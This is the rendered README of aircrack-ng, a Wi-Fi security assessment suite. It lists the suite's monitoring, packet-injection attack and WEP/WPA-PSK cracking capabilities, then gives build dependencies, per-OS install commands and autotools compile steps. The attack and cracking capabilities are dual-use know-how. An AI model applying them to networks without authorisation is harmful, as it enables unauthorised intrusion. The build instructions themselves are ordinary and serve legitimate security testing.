&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/a760076e46e116fcdad11bb80ae2c3014dc6a909/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d6f6273642e7376673f6c6566745f746578743d4f70656e4253442532304275696c64" alt="OpenBSD 6 Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-obsd.svg?left_text=OpenBSD%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://buildbot.aircrack-ng.org/" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/0c5620cb9916668af45743d061c074397a6b86ad/68747470733a2f2f6275696c64626f742e616972637261636b2d6e672e6f72672f6261646765732f616972637261636b2d6e672d6e657462736438312e7376673f6c6566745f746578743d4e65744253442532304275696c64" alt="NetBSD 8.1 Build Status" data-canonical-src="https://buildbot.aircrack-ng.org/badges/aircrack-ng-netbsd81.svg?left_text=NetBSD%20Build" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://scan.coverity.com/projects/aircrack-ng" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/d6492f7b1a2c7918c6d7273aa1ac3c078991b44e/68747470733a2f2f7363616e2e636f7665726974792e636f6d2f70726f6a656374732f616972637261636b2d6e672f62616467652e737667" alt="Coverity Scan Build Status" data-canonical-src="https://scan.coverity.com/projects/aircrack-ng/badge.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://packagecloud.io/aircrack-ng/git/install#bash-deb" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/9ad4a4cdf4ff03f61a6f898e42378a61057be310/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6465622d7061636b616765636c6f75642e696f2d3834346665632e737667" alt="PackageCloud DEB" data-canonical-src="https://img.shields.io/badge/deb-packagecloud.io-844fec.svg" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://packagecloud.io/aircrack-ng/git/install#bash-rpm" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/db20351fc9ad98f94bcd81048067ec4e57585aab/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f72706d2d7061636b616765636c6f75642e696f2d3834346665632e737667" alt="PackageCloud RPM" data-canonical-src="https://img.shields.io/badge/rpm-packagecloud.io-844fec.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Aircrack-ng is a complete suite of tools to assess WiFi network security.&lt;/p&gt;
&lt;p&gt;It focuses on different areas of WiFi security:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Monitoring: Packet capture and export of data to text files for further processing by third party tools.&lt;/li&gt;
&lt;li&gt;Attacking: Replay attacks, deauthentication, fake access points and others via packet injection.&lt;/li&gt;
&lt;li&gt;Testing: Checking WiFi cards and driver capabilities (capture and injection).&lt;/li&gt;
&lt;li&gt;Cracking: WEP and WPA PSK (WPA 1 and 2).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All tools are command line which allows for heavy scripting. A lot of GUIs have taken advantage of this feature. It works primarily Linux but also Windows, OS X, FreeBSD, OpenBSD, NetBSD, as well as Solaris and even eComStation 2.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-building" class="anchor" aria-hidden="true" href="#building"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-requirements" class="anchor" aria-hidden="true" href="#requirements"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Requirements&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Autoconf&lt;/li&gt;
&lt;li&gt;Automake&lt;/li&gt;
&lt;li&gt;Libtool&lt;/li&gt;
&lt;li&gt;shtool&lt;/li&gt;
&lt;li&gt;OpenSSL development package or libgcrypt development package.&lt;/li&gt;
&lt;li&gt;Airmon-ng (Linux) requires ethtool.&lt;/li&gt;
&lt;li&gt;On windows, cygwin has to be used and it also requires w32api package.&lt;/li&gt;
&lt;li&gt;On Windows, if using clang, libiconv and libiconv-devel&lt;/li&gt;
&lt;li&gt;Linux: LibNetlink 1 or 3. It can be disabled by passing --disable-libnl to configure.&lt;/li&gt;
&lt;li&gt;pkg-config (pkgconf on FreeBSD)&lt;/li&gt;
&lt;li&gt;FreeBSD, OpenBSD, NetBSD, Solaris and OS X with macports: gmake&lt;/li&gt;
&lt;li&gt;Linux/Cygwin: make and Standard C++ Library development package (Debian: libstdc++-dev)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-optional-stuff" class="anchor" aria-hidden="true" href="#optional-stuff"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Optional stuff&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;If you want SSID filtering with regular expression in airodump-ng
(-essid-regex) pcre development package is required.&lt;/li&gt;
&lt;li&gt;If you want to use airolib-ng and '-r' option in aircrack-ng,
SQLite development package &amp;gt;= 3.3.17 (3.6.X version or better is recommended)&lt;/li&gt;
&lt;li&gt;If you want to use Airpcap, the 'developer' directory from the CD/ISO/SDK is required.&lt;/li&gt;
&lt;li&gt;In order to build &lt;code&gt;besside-ng&lt;/code&gt;, &lt;code&gt;besside-ng-crawler&lt;/code&gt;, &lt;code&gt;easside-ng&lt;/code&gt;, &lt;code&gt;tkiptun-ng&lt;/code&gt; and &lt;code&gt;wesside-ng&lt;/code&gt;,
libpcap development package is required (on Cygwin, use the Aircap SDK instead; see above)&lt;/li&gt;
&lt;li&gt;For best performance on FreeBSD (50-70% more), install gcc5 (or better) via: pkg install gcc9&lt;/li&gt;
&lt;li&gt;rfkill&lt;/li&gt;
&lt;li&gt;If you want Airodump-ng to log GPS coordinates, gpsd is needed&lt;/li&gt;
&lt;li&gt;For best performance on SMP machines, ensure the hwloc library and headers are installed. It is strongly recommended on high core count systems, it may give a serious speed boost&lt;/li&gt;
&lt;li&gt;CMocka for unit testing&lt;/li&gt;
&lt;li&gt;For intergation testing on Linux only: tcpdump, HostAPd, WPA Supplicant and screen&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-installing-required-and-optional-dependencies" class="anchor" aria-hidden="true" href="#installing-required-and-optional-dependencies"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing required and optional dependencies&lt;/h2&gt;
&lt;p&gt;Below are instructions for installing the basic requirements to build
&lt;code&gt;aircrack-ng&lt;/code&gt; for a number of operating systems.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: CMocka, tcpdump, screen, HostAPd and WPA Supplicant should not be dependencies when packaging Aircrack-ng.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-linux" class="anchor" aria-hidden="true" href="#linux"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Linux&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-debianubuntu" class="anchor" aria-hidden="true" href="#debianubuntu"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Debian/Ubuntu&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install build-essential autoconf automake libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev libpcre3-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant tcpdump screen iw usbutils
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-fedoracentosrhel" class="anchor" aria-hidden="true" href="#fedoracentosrhel"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Fedora/CentOS/RHEL&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sudo yum install libtool pkgconfig sqlite-devel autoconf automake openssl-devel libpcap-devel pcre-devel rfkill libnl3-devel gcc gcc-c++ ethtool hwloc-devel libcmocka-devel git make file expect hostapd wpa_supplicant iw usbutils tcpdump screen
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: on CentOS and RedHat, HostAPd requires 'epel' repository to be enabled: sudo yum install epel-release&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-opensuse" class="anchor" aria-hidden="true" href="#opensuse"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;openSUSE&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sudo zypper install autoconf automake libtool pkg-config libnl3-devel libopenssl-1_1-devel zlib-devel libpcap-devel sqlite3-devel pcre-devel hwloc-devel libcmocka-devel hostapd wpa_supplicant tcpdump screen iw gcc-c++ gcc
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-mageia" class="anchor" aria-hidden="true" href="#mageia"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Mageia&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sudo urpmi autoconf automake libtool pkgconfig libnl3-devel libopenssl-devel zlib-devel libpcap-devel sqlite3-devel pcre-devel hwloc-devel libcmocka-devel hostapd wpa_supplicant tcpdump screen iw gcc-c++ gcc make
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-alpine" class="anchor" aria-hidden="true" href="#alpine"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Alpine&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sudo apk add gcc g++ make autoconf automake libtool libnl3-dev openssl-dev ethtool libpcap-dev cmocka-dev hostapd wpa_supplicant tcpdump screen iw pkgconf util-linux sqlite-dev pcre-dev linux-headers zlib-dev
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-bsd" class="anchor" aria-hidden="true" href="#bsd"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;BSD&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-freebsd" class="anchor" aria-hidden="true" href="#freebsd"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FreeBSD&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;pkg install pkgconf shtool libtool gcc9 automake autoconf pcre sqlite3 openssl gmake hwloc cmocka
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-dragonflybsd" class="anchor" aria-hidden="true" href="#dragonflybsd"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DragonflyBSD&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;pkg install pkgconf shtool libtool gcc8 automake autoconf pcre sqlite3 libgcrypt gmake cmocka
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-openbsd" class="anchor" aria-hidden="true" href="#openbsd"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;OpenBSD&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;pkg_add pkgconf shtool libtool gcc automake autoconf pcre sqlite3 openssl gmake cmocka
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-osx" class="anchor" aria-hidden="true" href="#osx"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;OSX&lt;/h3&gt;
&lt;p&gt;XCode, Xcode command line tools and HomeBrew are required.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;brew install autoconf automake libtool openssl shtool pkg-config hwloc pcre sqlite3 libpcap cmocka
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-windows" class="anchor" aria-hidden="true" href="#windows"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Windows&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-cygwin" class="anchor" aria-hidden="true" href="#cygwin"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cygwin&lt;/h4&gt;
&lt;p&gt;Cygwin requires the full path to the &lt;code&gt;setup.exe&lt;/code&gt; utility, in order to
automate the installation of the necessary packages. In addition, it
requires the location of your installation, a path to the cached
packages download location, and a mirror URL.&lt;/p&gt;
&lt;p&gt;An example of automatically installing all the dependencies
is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;c:\cygwin\setup-x86.exe -qnNdO -R C:/cygwin -s http://cygwin.mirror.constant.com -l C:/cygwin/var/cache/setup -P autoconf -P automake -P bison -P gcc-core -P gcc-g++ -P mingw-runtime -P mingw-binutils -P mingw-gcc-core -P mingw-gcc-g++ -P mingw-pthreads -P mingw-w32api -P libtool -P make -P python -P gettext-devel -P gettext -P intltool -P libiconv -P pkg-config -P git -P wget -P curl -P libpcre-devel -P libssl-devel -P libsqlite3-devel
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-msys2" class="anchor" aria-hidden="true" href="#msys2"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MSYS2&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;pacman -Sy autoconf automake-wrapper libtool msys2-w32api-headers msys2-w32api-runtime gcc pkg-config git python openssl-devel openssl libopenssl msys2-runtime-devel gcc binutils make pcre-devel libsqlite-devel
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-compiling" class="anchor" aria-hidden="true" href="#compiling"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Compiling&lt;/h2&gt;
&lt;p&gt;To build &lt;code&gt;aircrack-ng&lt;/code&gt;, the Autotools build system is utilized. Autotools replaces
the older method of compilation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: If utilizing a developer version, eg: one checked out from source control,
you will need to run a pre-&lt;code&gt;configure&lt;/code&gt; script. The script to use is one of the
following: &lt;code&gt;autoreconf -i&lt;/code&gt; or &lt;code&gt;env NOCONFIGURE=1 ./autogen.sh&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First, &lt;code&gt;./configure&lt;/code&gt; the project for building with the appropriate options specified
for your environment:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./configure &amp;lt;options&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;TIP&lt;/strong&gt;: If the above fails, please see above about developer source control versions.&lt;/p&gt;
&lt;p&gt;Next, compile the project (respecting if &lt;code&gt;make&lt;/code&gt; or &lt;code&gt;gmake&lt;/code&gt; is needed):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Compilation:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Compilation on *BSD or Solaris:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gmake&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Finally, the additional targets listed below may be of use in your environment:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Execute all unit testing:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make check&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Execute all integration testing (requires root):&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make integration&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Installing:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make install&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Uninstall:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;make uninstall&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
